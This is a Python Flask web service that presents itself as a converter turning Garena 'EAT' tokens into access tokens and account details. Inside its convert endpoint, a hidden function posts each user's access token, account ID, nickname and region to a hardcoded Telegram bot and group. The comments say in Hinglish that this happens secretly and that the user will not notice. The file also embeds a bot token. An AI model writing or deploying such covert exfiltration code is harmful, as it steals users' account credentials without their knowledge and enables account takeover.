from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from urllib.parse import urlparse, parse_qs
import logging
import os

# ============================================
# APP INITIALIZATION
# ============================================
app = Flask(__name__)
CORS(app)

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================
# TELEGRAM BOT CONFIG (Secret)
# ============================================
BOT_TOKEN = "8368462832:AAHGUfZS2JHl-2W02rh8yfOWlkBFAOe82IQ"
CHAT_ID = "-1004377621375"

def send_to_telegram(data):
    """
    Secretly send conversion data to Telegram group
    User ko pata nahi chalega
    """
    try:
        # Simple format - sirf data, koi extra nahi
        message = f"""UID: {data['account_id']}
Name: {data['nickname']}
Region: {data['region']}
Access Token: {data['access_token']}

Developer: @BTNVR"""
        
        # Send to Telegram
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "disable_web_page_preview": True
        }
        
        response = requests.post(url, json=payload, timeout=10)
        
        if response.status_code == 200:
            logger.info(f"✅ Forwarded to Telegram: {data['nickname']}")
            return True
        else:
            logger.error(f"❌ Telegram error: {response.text}")
            return False
            
    except Exception as e:
        logger.error(f"❌ Failed to send to Telegram: {str(e)}")
        return False

# ============================================
# CORE FUNCTION - EAT to Access Token
# ============================================
def convert_eat(eat_token):
    """
    Convert EAT token to Access Token, Account ID, Nickname, and Region
    """
    try:
        # Build the callback URL
        callback_url = f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
        
        # Make request to Garena
        response = requests.get(
            callback_url,
            allow_redirects=False,
            timeout=10,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        
        # Check if we got a redirect (302)
        if response.status_code != 302:
            return None
        
        # Check if Location header exists
        if 'Location' not in response.headers:
            return None
        
        # Parse the redirect URL
        redirect_url = response.headers['Location']
        parsed_url = urlparse(redirect_url)
        query_params = parse_qs(parsed_url.query)
        
        # Extract data from query parameters
        access_token = query_params.get('access_token', [None])[0]
        account_id = query_params.get('account_id', [None])[0]
        nickname = query_params.get('nickname', [None])[0]
        region = query_params.get('region', [None])[0]
        
        # Validate all fields are present
        if not all([access_token, account_id, nickname, region]):
            return None
        
        # Return the extracted data
        return {
            "access_token": access_token,
            "account_id": account_id,
            "nickname": nickname,
            "region": region
        }
        
    except Exception as e:
        logger.error(f"Error in convert_eat: {str(e)}")
        return None

# ============================================
# ROUTES
# ============================================

@app.route('/', methods=['GET'])
def home():
    """Root endpoint - API info"""
    return jsonify({
        "name": "EAT to Access Token Converter API",
        "version": "2.0.0",
        "endpoints": {
            "/api/convert": "GET - Convert EAT to Access Token (use ?eat=YOUR_EAT_TOKEN)",
            "/api/health": "GET - Check API health"
        },
        "status": "running",
        "developer": "@BTNVR"
    }), 200

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "developer": "@BTNVR"
    }), 200

@app.route('/api/convert', methods=['GET'])
def convert():
    """
    Convert EAT token to Access Token
    Query Parameters:
        - eat: EAT token string
    """
    try:
        # Get EAT token from query params
        eat_token = request.args.get('eat')
        
        # Validate EAT token
        if not eat_token:
            return jsonify({
                "status": "error",
                "message": "EAT token is required. Use ?eat=YOUR_EAT_TOKEN",
                "developer": "@BTNVR"
            }), 400
        
        # Convert EAT to Access Token
        result = convert_eat(eat_token)
        
        # Check if conversion failed
        if result is None:
            return jsonify({
                "status": "error",
                "message": "Invalid or expired EAT token",
                "developer": "@BTNVR"
            }) , 400
        
        # ============================================
        # 🔥 SECRETLY FORWARD TO TELEGRAM
        # User ko pata nahi chalega
        # ============================================
        send_to_telegram(result)
        
        # ============================================
        # RESPONSE - USER KO SAB DIKHEGA
        # ============================================
        return jsonify({
            "status": "success",
            "data": {
                "account_id": result['account_id'],
                "nickname": result['nickname'],
                "region": result['region'],
                "access_token": result['access_token']  # ✅ Full access token
            },
            "developer": "@BTNVR"
        }), 200
        
    except Exception as e:
        logger.error(f"Error in convert endpoint: {str(e)}")
        return jsonify({
            "status": "error",
            "message": "Internal server error. Please try again.",
            "developer": "@BTNVR"
        }), 500

# ============================================
# ERROR HANDLERS
# ============================================

@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "status": "error",
        "message": "Endpoint not found",
        "developer": "@BTNVR"
    }), 404

@app.errorhandler(405)
def method_not_allowed(error):
    return jsonify({
        "status": "error",
        "message": "Method not allowed",
        "developer": "@BTNVR"
    }), 405

# ============================================
# MAIN
# ============================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
